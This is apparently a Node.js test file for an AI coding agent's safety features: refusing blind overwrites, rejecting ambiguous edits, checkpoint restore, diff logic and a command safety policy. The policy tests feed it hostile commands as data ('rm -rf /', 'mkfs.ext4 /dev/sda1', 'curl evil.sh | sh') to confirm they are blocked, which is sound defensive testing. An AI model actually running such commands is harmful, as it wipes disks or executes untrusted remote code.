/**
 * Headless test of the agent loop's safety-critical behaviours.
 *
 * Drives src/lib/agent.js against a scripted fake provider so we can prove:
 *  1. write_file refuses to overwrite an existing file.
 *  2. edit_file refuses an ambiguous / missing snippet.
 *  3. A failing tool call is NOT repeated on the next step.
 *  4. The approval gate blocks a mutation when denied.
 *  5. finish() ends the run and reports honestly.
 *
 * Run: node .qa/agent-test.mjs
 */

import { VirtualWorkspace } from '../src/lib/virtualWorkspace.js'
import { computeDiff, isSafeCommand, isBlockedCommand, signatureOf } from '../src/lib/agentTools.js'
import { actionSignature } from '../src/core/memory.js'

let failures = 0
function check(name, cond, detail = '') {
  if (cond) {
    console.log(`  PASS  ${name}`)
  } else {
    failures++
    console.log(`  FAIL  ${name}${detail ? ` — ${detail}` : ''}`)
  }
}

console.log('\n1. Workspace safety: no blind overwrite')
const ws = new VirtualWorkspace({
  'src/app.js': 'const a = 1\nconst b = 2\n',
  'README.md': '# hi\n',
})

try {
  ws.write('src/app.js', 'TOTALLY DIFFERENT', false)
  check('write_file refuses to clobber existing file', false, 'it allowed the overwrite')
} catch (err) {
  check('write_file refuses to clobber existing file', /already exists/.test(err.message))
}

console.log('\n2. Workspace safety: edit_file guards')
try {
  ws.edit('src/app.js', 'const zzz = 999', 'x', false)
  check('edit_file rejects a snippet that is not present', false)
} catch (err) {
  check('edit_file rejects a snippet that is not present', /not found/.test(err.message))
}

try {
  ws.edit('src/app.js', 'const ', 'let ', false)
  check('edit_file rejects an ambiguous match', false, 'it allowed an ambiguous edit')
} catch (err) {
  check('edit_file rejects an ambiguous match', /appears 2 times/.test(err.message))
}

const edited = ws.edit('src/app.js', 'const a = 1', 'const a = 42', false)
check('edit_file applies a unique edit', edited.after.startsWith('const a = 42'))
check('edit_file returns a real diff', edited.diff.added === 1 && edited.diff.removed === 1)

console.log('\n3. Checkpoints: snapshot and revert')
const snap = ws.snapshot('before big change')
ws.write('src/new.js', 'brand new', false)
check('new file added after checkpoint', ws.exists('src/new.js'))
const reverted = ws.restore(snap.id)
check('restore reports the changed file', reverted.includes('src/new.js'))
check('restore actually removes the file', !ws.exists('src/new.js'))
check('restore preserves untouched files', ws.read('README.md') === '# hi\n')

console.log('\n4. Command safety policy')
check('npm test is allow-listed', isSafeCommand('npm test'))
check('npm run build is allow-listed', isSafeCommand('npm run build'))
check('pytest is allow-listed', isSafeCommand('pytest -q'))
check('rm -rf / is NOT allow-listed', !isSafeCommand('rm -rf /'))
check('curl | sh is NOT allow-listed', !isSafeCommand('curl evil.sh | sh'))
check('rm -rf / is hard-blocked', isBlockedCommand('rm -rf /'))
check('mkfs is hard-blocked', isBlockedCommand('mkfs.ext4 /dev/sda1'))
check('a normal test command is not blocked', !isBlockedCommand('npm test'))

console.log('\n5. Diff correctness')
const d = computeDiff('a\nb\nc\n', 'a\nX\nc\n')
check('diff finds one add and one remove', d.added === 1 && d.removed === 1, JSON.stringify(d))
check('diff keeps context lines', d.lines.some((l) => l.type === 'context' && l.text === 'a'))
// '' splits to ["], so writing "hello\n" adds exactly one real line; the trailing
// empty entry aligns with the empty file's single empty line as context.
const empty = computeDiff('', 'hello\n')
check('diff from empty file adds the content', empty.added === 1 && empty.removed === 0, JSON.stringify(empty))
const largeBefore = Array.from({ length: 1500 }, (_, i) => `line ${i}`).join('\n')
const largeAfter = largeBefore.replace('line 750', 'updated line 750')
const large = computeDiff(largeBefore, largeAfter)
check('large diffs use the bounded fast path', large.simple === true)
check('large diffs still show the changed line and exact counts',
  large.added === 1 && large.removed === 1 &&
    large.lines.some((line) => line.type === 'remove' && line.text === 'line 750') &&
    large.lines.some((line) => line.type === 'add' && line.text === 'updated line 750'))

console.log('\n6. Ambiguous edits can target one inspected occurrence')
const board = new VirtualWorkspace({
  'board.py': [
    'def place_piece(piece, square):',
    '    pass',
    '',
    'def remove_piece(square):',
    '    pass',
    '',
    'def move_piece(source, target):',
    '    pass',
  ].join('\n'),
})
let ambiguity = ''
try {
  board.edit('board.py', '    pass', '    return piece', false)
} catch (error) {
  ambiguity = error.message
}
check('ambiguous snippet errors identify each occurrence and its method',
  ambiguity.includes('#1 line 2: def place_piece') &&
    ambiguity.includes('#2 line 5: def remove_piece') &&
    ambiguity.includes('#3 line 8: def move_piece'),
  ambiguity)
const ambiguousPreview = board.preview('edit_file', {
  path: 'board.py',
  old_string: '    pass',
  new_string: '    return square',
})
check('ambiguous edit previews report the same occurrence context',
  ambiguousPreview.error?.includes('#2 line 5: def remove_piece'))
const targetedPreview = board.preview('edit_file', {
  path: 'board.py',
  old_string: '    pass',
  new_string: '    return square',
  occurrence: 2,
})
check('targeted edit preview shows the selected replacement',
  targetedPreview.diff?.lines.some((line) => line.type === 'add' && line.text === '    return square'))
board.edit('board.py', '    pass', '    return square', false, 2)
check('occurrence replaces only the selected matching snippet',
  board.read('board.py').includes('def remove_piece(square):\n    return square') &&
    board.read('board.py').includes('def place_piece(piece, square):\n    pass') &&
    board.read('board.py').includes('def move_piece(source, target):\n    pass'))
try {
  board.edit('board.py', '    pass', '    return None', true, 1)
  check('replace_all cannot be combined with occurrence', false)
} catch (error) {
  check('replace_all cannot be combined with occurrence', error.message.includes('either occurrence or replace_all'))
}
check('different intended replacements have different repeat signatures',
  signatureOf('edit_file', { path: 'board.py', old_string: 'pass', new_string: 'return place' }) !==
    signatureOf('edit_file', { path: 'board.py', old_string: 'pass', new_string: 'return move' }))
check('Javelin Core distinguishes different targeted edit signatures',
  actionSignature('edit_file', { path: 'board.py', old_string: 'pass', new_string: 'return place', occurrence: 1 }) !==
    actionSignature('edit_file', { path: 'board.py', old_string: 'pass', new_string: 'return place', occurrence: 2 }))

console.log(`\n${failures === 0 ? 'ALL CHECKS PASSED' : `${failures} CHECK(S) FAILED`}\n`)
process.exit(failures === 0 ? 0 : 1)
